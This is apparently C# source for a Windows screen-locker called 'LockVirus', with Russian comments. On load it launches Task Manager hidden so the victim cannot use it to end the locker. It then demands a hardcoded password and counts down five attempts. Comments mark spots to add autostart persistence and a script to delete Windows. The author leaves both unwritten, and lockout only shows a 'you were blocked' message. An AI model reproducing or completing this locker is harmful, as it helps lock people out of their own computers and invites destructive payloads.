using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Diagnostics;
using System.Windows.Forms;

namespace LockVirus
{
    public partial class Form1 : Form
    {
        //Пароль
        string pass = "5051";
        //Попытки
        int attempts = 5;

        public Form1()
        {
            InitializeComponent();
            this.Load += new EventHandler(Form1_Load);
            this.FormClosed += new FormClosedEventHandler(Form1_FormClosed);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Attempts.Text = attempts.ToString();

            Process p = new Process();
            p.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System);
            p.StartInfo.FileName = "taskmgr.exe";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();
            this.Focus();

            //Суда впишите код для добавления в автозагрузку если вам надо



        }

        void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Process.GetProcessesByName("taskmgr")[0].Kill();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (password.Text == pass)
            {

                Environment.Exit(0);

            }
            else
            {
                if (attempts != 0)
                {
                    attempts -= 1;
                    Attempts.Text = attempts.ToString();
                }
                if (attempts == 0)
                {
                    //Суда скрипт удаления винды или т.д. тут будет скрипт не удаления винды тк жалко винду ;3
                    MessageBox.Show("Ты был заблокирован", "LOCKVIRUS");
                }
            }

        }

        private void Attempts_Click(object sender, EventArgs e)
        {

        }
    }
}
